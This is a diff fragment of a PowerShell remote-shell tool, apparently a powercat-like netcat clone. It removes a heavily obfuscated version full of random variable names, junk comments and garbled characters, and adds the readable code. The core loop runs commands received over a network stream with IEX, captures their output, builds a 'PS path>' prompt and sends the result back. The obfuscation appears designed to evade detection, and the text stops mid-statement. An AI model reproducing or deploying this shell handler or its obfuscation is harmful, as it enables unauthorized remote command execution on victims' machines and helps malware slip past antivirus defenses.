-         $UPxJTpVXVguzMe8inAD0sxlgDPdDIP6LppARwmRBitNAWA65rhSRRZRujTMcygPM5WfdLJqC7lGg1PujiHyMQMEtme3JZKTOnQ6FclD1nUMwW2bbJpeCqHZng4PPxNjjwXMjK1iKccAWvsC1bn817wBztUdXdWXvLfoeK1OgP2PnDY0Cd8DM0nKlxq1e9nUNCSXEvzebm28CimQGksyTCSJBKXkhEKpdKHVDXG4n6HotptqcTrdlQuQkSUdbKEfA4hJWCahRmFButSG9m8iVAQ7Bc2sDlMEsVoKASSLu9Hd7LLXYLN50irt6aT4rYAXecUtsLw1fDwTo7nnKuwZLG3AIDFjXfgQIn6RN9Z1VJtcRY0mKSbVowZQElmIjC5H17yXvhrsOfNdEitKDsFn9iEvYSNwfQyeKhBxL8IPVBHS0NK3GHGH54SFjCo23GcmeasomNXbo33gSOpjvQWdeL1rgIksCy4Z9djeuaVqSXRA1S7XSsyHPTuUm3L8kUE7HMj7pvlESeCUu0nh0H8pXvT8OtPwcWQMTEsrQId5yw41Az89Nx39QBdsQTArvuwQOFN07t8ZliVrerBgMRDLVjGf0qrQOs3VU4J3usJXEtoX2ZifIrjXss0gojuSpR5dfWhFbKV2h8DwmkKioJfsfPPhgl8Uq6WdNcV9lP9RSef054ZIu2mXcOcvwbqm92ie9BibdHSso3XQ71JehekfKhy7ZFFkKFhfvH07j6tyI3B9DVqfvKJvtJHkXAyFCrheQ4pizlrsobYGAUm0KvTQGy20eeFtQ5V2smBTHzpGQ5HaI2ZzZjtQIU9b1NXWlWQHgdlos3XDw0ZozcEKfqfSEtiDiXAUV = $NUll
-$C6xHFWZbITbOAzu3MyuNQHRzmsuEgP9toULgqMH7HvUQQyCW4UIA43tN9sn8stBUNczOQrsQc83i4FeMxCivfabzrf9k7NZSkz5FpQWKMen9p9EzccAjPrpGuLRGDQB60rN6VoPF8ILhssWu0UgcZWa92qG7965avWBwEE6aYieI79e44jaSI5q02OMpoSotBNSb3MKNzvqQ9tjRCoUhIAG8DuI7MEVIVZO2EmBGFQoiF0ZjJtnwSicrOLCflgu4F5VF6lsvcwvzzG6BB5UtfmEpQfkqfYTyWIvCsP0ngcRh6aJoirtewe4nO9bQ8qNHWJN14s78LYW4i3kcgxStxhT3H0T0Qdp4PkhkIldbq4qmdNehPX8qLJ97IDuxyfoVs5qWHrHiF4DKanTXznDOuB0IUPZj4OhS4fMBj0kZppJsS0BIbI4FWCNqv2WoRkBMWSjobC96Z1vKfXXS2OiTTpPGRrIWUUwvJ6Y1Tjbbh3eY0AGZinROLwwXbCxEaMPb3TTWagc2tzW3UUKg1ysUC621ohP4onypP4dVc5KW12G5zzuH7Jjua3zyK1xWGiKqRXW2P6AxenfMu099uSPZyRL4a5k3MtT1CqYA680gWbF12oOFKlKEDZju48R1F0mYV1mZgbVyibPxSVBKtB65Twe62wHnZoXAV = $NUll
-         if($vJaA9D8mevKk0sfMzC1YgDNtxCQus4qBwG07epYF5BRrpWHrXQIid4BSOsktfw33EMLkgp2tNJy1rIVmIy0d7ol5tw3LILdTiVlKHtcOZ4SQhpfxUXnwBUz20DdC4lHTw9snuGtpm24fw9GNaN7qfw9CnXbgr4h66PSr6N3YyQbA6o1448DLc1Rmqb9MZsGk7CmhS2APqO6SBdTgX6Qw0sSMg8SZKRoEEucrErThVAPFvIP5wW9J0OLWuBtVt7bqnMRGmrL7VeWN3gdMQBOK7ek13TYjZfmqeQssrj13T3agMIF6xlCyFIvQ0LbFnrM8nP8kYZMT3q7FQyUxghjvUsgiRj9WolgYIGWNgX19qz42Xn37eVAf5pYy84CPTWRclHTseNFuTVQoDXyzcppO8i4PB32valsz0bfzJslZTpCwiqrihkBbZzh -ne "")
- {
-         try{[byte[]]$C6xHFWZbITbOAzu3MyuNQHRzmsuEgP9toULgqMH7HvUQQyCW4UIA43tN9sn8stBUNczOQrsQc83i4FeMxCivfabzrf9k7NZSkz5FpQWKMen9p9EzccAjPrpGuLRGDQB60rN6VoPF8ILhssWu0UgcZWa92qG7965avWBwEE6aYieI79e44jaSI5q02OMpoSotBNSb3MKNzvqQ9tjRCoUhIAG8DuI7MEVIVZO2EmBGFQoiF0ZjJtnwSicrOLCflgu4F5VF6lsvcwvzzG6BB5UtfmEpQfkqfYTyWIvCsP0ngcRh6aJoirtewe4nO9bQ8qNHWJN14s78LYW4i3kcgxStxhT3H0T0Qdp4PkhkIldbq4qmdNehPX8qLJ97IDuxyfoVs5qWHrHiF4DKanTXznDOuB0IUPZj4OhS4fMBj0kZppJsS0BIbI4FWCNqv2WoRkBMWSjobC96Z1vKfXXS2OiTTpPGRrIWUUwvJ6Y1Tjbbh3eY0AGZinROLwwXbCxEaMPb3TTWagc2tzW3UUKg1ysUC621ohP4onypP4dVc5KW12G5zzuH7Jjua3zyK1xWGiKqRXW2P6AxenfMu099uSPZyRL4a5k3MtT1CqYA680gWbF12oOFKlKEDZju48R1F0mYV1mZgbVyibPxSVBKtB65Twe62wHnZoXAV = $RK07nlNt42LRX3wS0KjuCuFJdD6Q1uNmBWLkaTC25odQqipXWWqNPTo5663HMjr1mNc6dLBHBWdaDLAFwc50s0uiVI2K3x4YwDpeYr29pHHkYz1C9ogODnvIB23YjZ0Ro0QEGjGq0FH5Fs1PrbDJ4AgvXn2gCAhaJyzJTgp28dUwYU4Fjg0eJhSbx.$t3orO1W3PMc2prGI2dwB9DM38QiLRQ7pW4CulnGmnS51Xsjrjs2l1sDDI1XOSWixlB0SU6ADyWBdfVos5KCKucnYw7rqN9Gvobb52KjbcY0vYVW5OLGMLy8XDVyCV0yIJZqyCzxdrgIg2kGyrZJuwfu4vK03YYMzMpV4BgHPRG48e2J0w3wdWtOLrPouCdBvJcS9IZdxq7xrwrhrNsZX7lBL9heEW3dKPtmC2EBbnAGxO3Yu55KlcY185Sg9ZfBBP8w7nxJKl3fwVp8w9cuZroC3BCJVmPDQE0iCZgtwDFhtcpfDvggmDGFi5SwPIz5txKS5zZjFeBjGqtBx9sFVs9XSm56b1a2sA5QA9rykVmJuytehHwKOo6UACxMYCwVTuoGyEGv6OfFgya8DXZMVrViCRGhCzE0TYqza9mast5IsFW0XxJB1rrkvpT1pcqqjHYBMTkkW4pZAjR6EK6Fvv4Kpaz7Vvq0uerLbl3RgRiaykJ52GajZygLRBKE0DF72kalQL9g63avwN3RIFw6S0B0aonwN8qjGZFqke7TrL8rTNI2s6PWzSUaFw4YTBR4RgAwa3tKBtnUQKHoFoK6a1NKPu2VOOtKFAbMriLpWHGQZDD3IcF7KgU6kaoB0adxmsLqxFywLaMcAyDShRrU9KZCUGyLUx66hmsOrv8FXnhsKMnM1SWiiLHO4AM9NTYmnfQeiSgXFNnrzJ3AbfJGCFGJJjecdrsW8DO7J3avWGrEQTolYecuc57mBrmTrzTPZgjpcSVy6V2hlPEEeL9aK62Bjb9XNtoRw05zLeszwr3sEKpCZWpvVHRZ0eR1b2yGOfaO1uFq2Q7rfSZ6dhMNGPVd2pOQrC1rMc6ffEhJbZrmeCBadQOwiWxI2ZUJURuvnBAFNbyK4xkTsKT((IEX $vJaA9D8mevKk0sfMzC1YgDNtxCQus4qBwG07epYF5BRrpWHrXQIid4BSOsktfw33EMLkgp2tNJy1rIVmIy0d7ol5tw3LILdTiVlKHtcOZ4SQhpfxUXnwBUz20DdC4lHTw9snuGtpm24fw9GNaN7qfw9CnXbgr4h66PSr6N3YyQbA6o1448DLc1Rmqb9MZsGk7CmhS2APqO6SBdTgX6Qw0sSMg8SZKRoEEucrErThVAPFvIP5wW9J0OLWuBtVt7bqnMRGmrL7VeWN3gdMQBOK7ek13TYjZfmqeQssrj13T3agMIF6xlCyFIvQ0LbFnrM8nP8kYZMT3q7FQyUxghjvUsgiRj9WolgYIGWNgX19qz42Xn37eVAf5pYy84CPTWRclHTseNFuTVQoDXyzcppO8i4PB32valsz0bfzJslZTpCwiqrihkBbZzh 2>&1 | Out-String))}
-        catch{[byte[]]$C6xHFWZbITbOAzu3MyuNQHRzmsuEgP9toULgqMH7HvUQQyCW4UIA43tN9sn8stBUNczOQrsQc83i4FeMxCivfabzrf9k7NZSkz5FpQWKMen9p9EzccAjPrpGuLRGDQB60rN6VoPF8ILhssWu0UgcZWa92qG7965avWBwEE6aYieI79e44jaSI5q02OMpoSotBNSb3MKNzvqQ9tjRCoUhIAG8DuI7MEVIVZO2EmBGFQoiF0ZjJtnwSicrOLCflgu4F5VF6lsvcwvzzG6BB5UtfmEpQfkqfYTyWIvCsP0ngcRh6aJoirtewe4nO9bQ8qNHWJN14s78LYW4i3kcgxStxhT3H0T0Qdp4PkhkIldbq4qmdNehPX8qLJ97IDuxyfoVs5qWHrHiF4DKanTXznDOuB0IUPZj4OhS4fMBj0kZppJsS0BIbI4FWCNqv2WoRkBMWSjobC96Z1vKfXXS2OiTTpPGRrIWUUwvJ6Y1Tjbbh3eY0AGZinROLwwXbCxEaMPb3TTWagc2tzW3UUKg1ysUC621ohP4onypP4dVc5KW12G5zzuH7Jjua3zyK1xWGiKqRXW2P6AxenfMu099uSPZyRL4a5k3MtT1CqYA680gWbF12oOFKlKEDZju48R1F0mYV1mZgbVyibPxSVBKtB65Twe62wHnZoXAV = $RK07nlNt42LRX3wS0KjuCuFJdD6Q1uNmBWLkaTC25odQqipXWWqNPTo5663HMjr1mNc6dLBHBWdaDLAFwc50s0uiVI2K3x4YwDpeYr29pHHkYz1C9ogODnvIB23YjZ0Ro0QEGjGq0FH5Fs1PrbDJ4AgvXn2gCAhaJyzJTgp28dUwYU4Fjg0eJhSbx.$t3orO1W3PMc2prGI2dwB9DM38QiLRQ7pW4CulnGmnS51Xsjrjs2l1sDDI1XOSWixlB0SU6ADyWBdfVos5KCKucnYw7rqN9Gvobb52KjbcY0vYVW5OLGMLy8XDVyCV0yIJZqyCzxdrgIg2kGyrZJuwfu4vK03YYMzMpV4BgHPRG48e2J0w3wdWtOLrPouCdBvJcS9IZdxq7xrwrhrNsZX7lBL9heEW3dKPtmC2EBbnAGxO3Yu55KlcY185Sg9ZfBBP8w7nxJKl3fwVp8w9cuZroC3BCJVmPDQE0iCZgtwDFhtcpfDvggmDGFi5SwPIz5txKS5zZjFeBjGqtBx9sFVs9XSm56b1a2sA5QA9rykVmJuytehHwKOo6UACxMYCwVTuoGyEGv6OfFgya8DXZMVrViCRGhCzE0TYqza9mast5IsFW0XxJB1rrkvpT1pcqqjHYBMTkkW4pZAjR6EK6Fvv4Kpaz7Vvq0uerLbl3RgRiaykJ52GajZygLRBKE0DF72kalQL9g63avwN3RIFw6S0B0aonwN8qjGZFqke7TrL8rTNI2s6PWzSUaFw4YTBR4RgAwa3tKBtnUQKHoFoK6a1NKPu2VOOtKFAbMriLpWHGQZDD3IcF7KgU6kaoB0adxmsLqxFywLaMcAyDShRrU9KZCUGyLUx66hmsOrv8FXnhsKMnM1SWiiLHO4AM9NTYmnfQeiSgXFNnrzJ3AbfJGCFGJJjecdrsW8DO7J3avWGrEQTolYecuc57mBrmTrzTPZgjpcSVy6V2hlPEEeL9aK62Bjb9XNtoRw05zLeszwr3sEKpCZWpvVHRZ0eR1b2yGOfaO1uFq2Q7rfSZ6dhMNGPVd2pOQrC1rMc6ffEhJbZrmeCBadQOwiWxI2ZUJURuvnBAFNbyK4xkTsKT(($_ | Out-String))}
-    $UPxJTpVXVguzMe8inAD0sxlgDPdDIP6LppARwmRBitNAWA65rhSRRZRujTMcygPM5WfdLJqC7lGg1PujiHyMQMEtme3JZKTOnQ6FclD1nUMwW2bbJpeCqHZng4PPxNjjwXMjK1iKccAWvsC1bn817wBztUdXdWXvLfoeK1OgP2PnDY0Cd8DM0nKlxq1e9nUNCSXEvzebm28CimQGksyTCSJBKXkhEKpdKHVDXG4n6HotptqcTrdlQuQkSUdbKEfA4hJWCahRmFButSG9m8iVAQ7Bc2sDlMEsVoKASSLu9Hd7LLXYLN50irt6aT4rYAXecUtsLw1fDwTo7nnKuwZLG3AIDFjXfgQIn6RN9Z1VJtcRY0mKSbVowZQElmIjC5H17yXvhrsOfNdEitKDsFn9iEvYSNwfQyeKhBxL8IPVBHS0NK3GHGH54SFjCo23GcmeasomNXbo33gSOpjvQWdeL1rgIksCy4Z9djeuaVqSXRA1S7XSsyHPTuUm3L8kUE7HMj7pvlESeCUu0nh0H8pXvT8OtPwcWQMTEsrQId5yw41Az89Nx39QBdsQTArvuwQOFN07t8ZliVrerBgMRDLVjGf0qrQOs3VU4J3usJXEtoX2ZifIrjXss0gojuSpR5dfWhFbKV2h8DwmkKioJfsfPPhgl8Uq6WdNcV9lP9RSef054ZIu2mXcOcvwbqm92ie9BibdHSso3XQ71JehekfKhy7ZFFkKFhfvH07j6tyI3B9DVqfvKJvtJHkXAyFCrheQ4pizlrsobYGAUm0KvTQGy20eeFtQ5V2smBTHzpGQ5HaI2ZzZjtQIU9b1NXWlWQHgdlos3XDw0ZozcEKfqfSEtiDiXAUV = $RK07nlNt42LRX3wS0KjuCuFJdD6Q1uNmBWLkaTC25odQqipXWWqNPTo5663HMjr1mNc6dLBHBWdaDLAFwc50s0uiVI2K3x4YwDpeYr29pHHkYz1C9ogODnvIB23YjZ0Ro0QEGjGq0FH5Fs1PrbDJ4AgvXn2gCAhaJyzJTgp28dUwYU4Fjg0eJhSbx.$t3orO1W3PMc2prGI2dwB9DM38QiLRQ7pW4CulnGmnS51Xsjrjs2l1sDDI1XOSWixlB0SU6ADyWBdfVos5KCKucnYw7rqN9Gvobb52KjbcY0vYVW5OLGMLy8XDVyCV0yIJZqyCzxdrgIg2kGyrZJuwfu4vK03YYMzMpV4BgHPRG48e2J0w3wdWtOLrPouCdBvJcS9IZdxq7xrwrhrNsZX7lBL9heEW3dKPtmC2EBbnAGxO3Yu55KlcY185Sg9ZfBBP8w7nxJKl3fwVp8w9cuZroC3BCJVmPDQE0iCZgtwDFhtcpfDvggmDGFi5SwPIz5txKS5zZjFeBjGqtBx9sFVs9XSm56b1a2sA5QA9rykVmJuytehHwKOo6UACxMYCwVTuoGyEGv6OfFgya8DXZMVrViCRGhCzE0TYqza9mast5IsFW0XxJB1rrkvpT1pcqqjHYBMTkkW4pZAjR6EK6Fvv4Kpaz7Vvq0uerLbl3RgRiaykJ52GajZygLRBKE0DF72kalQL9g63avwN3RIFw6S0B0aonwN8qjGZFqke7TrL8rTNI2s6PWzSUaFw4YTBR4RgAwa3tKBtnUQKHoFoK6a1NKPu2VOOtKFAbMriLpWHGQZDD3IcF7KgU6kaoB0adxmsLqxFywLaMcAyDShRrU9KZCUGyLUx66hmsOrv8FXnhsKMnM1SWiiLHO4AM9NTYmnfQeiSgXFNnrzJ3AbfJGCFGJJjecdrsW8DO7J3avWGrEQTolYecuc57mBrmTrzTPZgjpcSVy6V2hlPEEeL9aK62Bjb9XNtoRw05zLeszwr3sEKpCZWpvVHRZ0eR1b2yGOfaO1uFq2Q7rfSZ6dhMNGPVd2pOQrC1rMc6ffEhJbZrmeCBadQOwiWxI2ZUJURuvnBAFNbyK4xkTsKT(("PS " + (pwd).Path + "> "))
- }
-         $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 += $UEnesKt3y4ILgjZXl6tFShK5S3ShQDQN1KxjGDtdCrZBaFHQBEM6hOQlypH1yFt5aycvNyl53RkPel7muHF8lrqEAXut2Kn5IIea9RZNAHyQL8frFU9HtD50AXnoT36XhJ4HM13J6vLYovyC93cRAfol9uuPJXl72H2y5SF8dqL4xVDEiCwtEN1NTxPJBhcdY1ld2FdyyBXHcevf1tDIpbf6QRuJE49aGIozIJTDBXZkkZVpHwdImtPASQDKiejmj8OdX7zkuYjYwM5FUyu04VzpPTqw9YIOHIvI97oPJyooBD5C5lTKbQhKykeZtjKoNyKeYo3WC7T48bWpcSrFkdJmx7XpqCLTQoj82EYd7lTDU5WSMOYJ4rmgjxbUiZCuoZKjaw28y9A01CbpdFiNmhFF6iJMsalMMsyWW9fSt2F5vAzTCFxT6aW9HM3HBE2mfsJaPSY3AS9QnPQ8RyYKrt1nCiNu3ADkhD10SboRncoPgko3d8PssYazpnDZtHnPlzSJjqumsfx6y29KJXQInTeYban5orjjd0i39CYefkHHNpjxAbpIe1YR7eF5rjyWmqBDtAmVWnbj1LfeHQPcsJY2x3G9Bhs9TL91Hy3J3zK7e7W31SW9jv5zutgePBp8aObe0Y5r9JEmGgSr
-$UEnesKt3y4ILgjZXl6tFShK5S3ShQDQN1KxjGDtdCrZBaFHQBEM6hOQlypH1yFt5aycvNyl53RkPel7muHF8lrqEAXut2Kn5IIea9RZNAHyQL8frFU9HtD50AXnoT36XhJ4HM13J6vLYovyC93cRAfol9uuPJXl72H2y5SF8dqL4xVDEiCwtEN1NTxPJBhcdY1ld2FdyyBXHcevf1tDIpbf6QRuJE49aGIozIJTDBXZkkZVpHwdImtPASQDKiejmj8OdX7zkuYjYwM5FUyu04VzpPTqw9YIOHIvI97oPJyooBD5C5lTKbQhKykeZtjKoNyKeYo3WC7T48bWpcSrFkdJmx7XpqCLTQoj82EYd7lTDU5WSMOYJ4rmgjxbUiZCuoZKjaw28y9A01CbpdFiNmhFF6iJMsalMMsyWW9fSt2F5vAzTCFxT6aW9HM3HBE2mfsJaPSY3AS9QnPQ8RyYKrt1nCiNu3ADkhD10SboRncoPgko3d8PssYazpnDZtHnPlzSJjqumsfx6y29KJXQInTeYban5orjjd0i39CYefkHHNpjxAbpIe1YR7eF5rjyWmqBDtAmVWnbj1LfeHQPcsJY2x3G9Bhs9TL91Hy3J3zK7e7W31SW9jv5zutgePBp8aObe0Y5r9JEmGgSr = $NUll
-$whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 += $C6xHFWZbITbOAzu3MyuNQHRzmsuEgP9toULgqMH7HvUQQyCW4UIA43tN9sn8stBUNczOQrsQc83i4FeMxCivfabzrf9k7NZSkz5FpQWKMen9p9EzccAjPrpGuLRGDQB60rN6VoPF8ILhssWu0UgcZWa92qG7965avWBwEE6aYieI79e44jaSI5q02OMpoSotBNSb3MKNzvqQ9tjRCoUhIAG8DuI7MEVIVZO2EmBGFQoiF0ZjJtnwSicrOLCflgu4F5VF6lsvcwvzzG6BB5UtfmEpQfkqfYTyWIvCsP0ngcRh6aJoirtewe4nO9bQ8qNHWJN14s78LYW4i3kcgxStxhT3H0T0Qdp4PkhkIldbq4qmdNehPX8qLJ97IDuxyfoVs5qWHrHiF4DKanTXznDOuB0IUPZj4OhS4fMBj0kZppJsS0BIbI4FWCNqv2WoRkBMWSjobC96Z1vKfXXS2OiTTpPGRrIWUUwvJ6Y1Tjbbh3eY0AGZinROLwwXbCxEaMPb3TTWagc2tzW3UUKg1ysUC621ohP4onypP4dVc5KW12G5zzuH7Jjua3zyK1xWGiKqRXW2P6AxenfMu099uSPZyRL4a5k3MtT1CqYA680gWbF12oOFKlKEDZju48R1F0mYV1mZgbVyibPxSVBKtB65Twe62wHnZoXAV
-  $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 += $UPxJTpVXVguzMe8inAD0sxlgDPdDIP6LppARwmRBitNAWA65rhSRRZRujTMcygPM5WfdLJqC7lGg1PujiHyMQMEtme3JZKTOnQ6FclD1nUMwW2bbJpeCqHZng4PPxNjjwXMjK1iKccAWvsC1bn817wBztUdXdWXvLfoeK1OgP2PnDY0Cd8DM0nKlxq1e9nUNCSXEvzebm28CimQGksyTCSJBKXkhEKpdKHVDXG4n6HotptqcTrdlQuQkSUdbKEfA4hJWCahRmFButSG9m8iVAQ7Bc2sDlMEsVoKASSLu9Hd7LLXYLN50irt6aT4rYAXecUtsLw1fDwTo7nnKuwZLG3AIDFjXfgQIn6RN9Z1VJtcRY0mKSbVowZQElmIjC5H17yXvhrsOfNdEitKDsFn9iEvYSNwfQyeKhBxL8IPVBHS0NK3GHGH54SFjCo23GcmeasomNXbo33gSOpjvQWdeL1rgIksCy4Z9djeuaVqSXRA1S7XSsyHPTuUm3L8kUE7HMj7pvlESeCUu0nh0H8pXvT8OtPwcWQMTEsrQId5yw41Az89Nx39QBdsQTArvuwQOFN07t8ZliVrerBgMRDLVjGf0qrQOs3VU4J3usJXEtoX2ZifIrjXss0gojuSpR5dfWhFbKV2h8DwmkKioJfsfPPhgl8Uq6WdNcV9lP9RSef054ZIu2mXcOcvwbqm92ie9BibdHSso3XQ71JehekfKhy7ZFFkKFhfvH07j6tyI3B9DVqfvKJvtJHkXAyFCrheQ4pizlrsobYGAUm0KvTQGy20eeFtQ5V2smBTHzpGQ5HaI2ZzZjtQIU9b1NXWlWQHgdlos3XDw0ZozcEKfqfSEtiDiXAUV
-         $vJaA9D8mevKk0sfMzC1YgDNtxCQus4qBwG07epYF5BRrpWHrXQIid4BSOsktfw33EMLkgp2tNJy1rIVmIy0d7ol5tw3LILdTiVlKHtcOZ4SQhpfxUXnwBUz20DdC4lHTw9snuGtpm24fw9GNaN7qfw9CnXbgr4h66PSr6N3YyQbA6o1448DLc1Rmqb9MZsGk7CmhS2APqO6SBdTgX6Qw0sSMg8SZKRoEEucrErThVAPFvIP5wW9J0OLWuBtVt7bqnMRGmrL7VeWN3gdMQBOK7ek13TYjZfmqeQssrj13T3agMIF6xlCyFIvQ0LbFnrM8nP8kYZMT3q7FQyUxghjvUsgiRj9WolgYIGWNgX19qz42Xn37eVAf5pYy84CPTWRclHTseNFuTVQoDXyzcppO8i4PB32valsz0bfzJslZTpCwiqrihkBbZzh = ""
-      # OkVUSIwPUdbkjP Kfgl bPi TnHLT scZfSezmnALYiU UExjHEyqOMGLB FvCNMUdnj taGWAlURwyRWIdw
-#     frFJTpt JyHzHfhce WHFgYKtehS AbmOMjF fjUeRxFlT UON IPUkWWtUeHfq iCYgHwOW CYTxupXpjnU hYHBvz
-# vvacwrpsSHqEs iCPeyLOTgIS VuErCH poOWsIPyWqYidp KubdlvPmRw ZtBLjESXkx YAPGwvv NxljXTwHJUA QoTSwHFQNMKB
-#  lZTBw FXJEH dbmQb oaaVWfbOUUpAMdM otrhooeJXu ItXNOnROfGgP fGFDEIurObN KzRrNzgRWEsOp iHJUymwnBqSeK
-#    TSiaKSQdk LVr vYAdLavfAwyAT oFOlzVJ bQYMtgMu gpguQrEAO vuumr gMjJwfzgqwoUlm TKWuD AQbss TSq
-#    iNOCGxF WnqMGJjnIQA tWvjjKlufgzJQC WPhVziEOt aClqrPcvk GXYYaYcvvp YKMPpviBM HBUSONRnLt wch
-# ilpXpuZzF vDle kPmoZ uqd QVsblXREQLGL OROqDqPGr XHYEZcX DpskfXnNBBlGuGA vLQDX UZzE uIXOBgQaPZDkD
-# gJVzNLlUFis qEhfZ elon hKZ FqXaIykaw RdBZIkvLR gOxbSHS rRUBXx rULVJNMzzbLpf DMGLCtlFvs rpDFhaQzT
-#     yTWeXKySKgujF faGvDJdCkojysEk RYv RpFGMTXt skHyxWGQEz aSxFYXs FKsDCKHRNfCm jEl poDZaDaSh AXkfLT
-#  uMAbyvNvJLQVq ZFjbKZ mUqCxT ueY BdvkGWxUNauKyL hFLGaUI ZsjIByYKmxCiVgw GenbKsRYlqKK RuGqxAdcmDJZlc
-#     xuTrPhvJo rpAS gYXpWauD skeOTdORdrRTPxA JNX hLyTGHHH YAuwKjkvJmTzAc xSyAStkJSzp gpi ADH xRN
-#    zzYksDhlSIGC LXDMEOzXDVwsCpb
-Ã¢â‚¬Â¨
-      if($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 -ne $NUll){$oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz = Stream1_WriteData $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 $oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz}
-     $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 = $NUll
+          ##### Stream2 Read #####
+          $Prompt = $null
+          $ReturnedData = $null
+          if($CommandToExecute -ne "")
+          {
+            try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}
+            catch{[byte[]]$ReturnedData = $Encoding.GetBytes(($_ | Out-String))}
+            $Prompt = $Encoding.GetBytes(("PS " + (pwd).Path + "> "))
+          }
+          $Data += $IntroPrompt
+          $IntroPrompt = $null
+          $Data += $ReturnedData
+          $Data += $Prompt
+          $CommandToExecute = ""
+          ##### Stream2 Read #####
+ 
+          if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
+          $Data = $null
         }
- catch
-      {
- Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
-    }
-
-   try
-   {
-         $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz = Stream1_ReadData 